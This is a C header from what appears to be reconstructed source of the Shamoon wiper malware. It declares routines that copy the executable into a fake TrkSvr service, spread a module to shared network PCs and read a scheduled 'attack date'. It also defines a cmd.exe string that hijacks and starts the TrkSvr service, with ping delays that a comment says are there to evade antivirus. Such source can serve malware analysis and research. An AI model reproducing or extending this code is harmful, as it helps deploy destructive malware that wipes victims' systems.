/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "Global\Global.h"

bool CopyCurrentExecutableToTrkSvr();
bool WriteModuleOnSharedPC(const WCHAR *a1, const WCHAR *a2);

#define ADA_MINUTE 5
#define ADA_HOUR   4
#define ADA_DAY    3
#define ADA_MONTH  1
#define ADA_YEAR   0

bool GetAttackDateFromFile(WORD *a1);
int TimeToAttack();
bool TryToRunServiceNetinit(const WCHAR *a1);

// Primitive sleeps, presumably to circumvent AV
#define TRKSRV_CMD \
	L"\\System32\\cmd.exe /c \"" \
	L"ping -n 30 127.0.0.1 >nul && " \
	L"sc config TrkSvr binpath= system32\\trksrv.exe && " \
	L"ping -n 10 127.0.0.1 >nul && " \
	L"sc start TrkSvr \""

bool SetupTrkSvrService();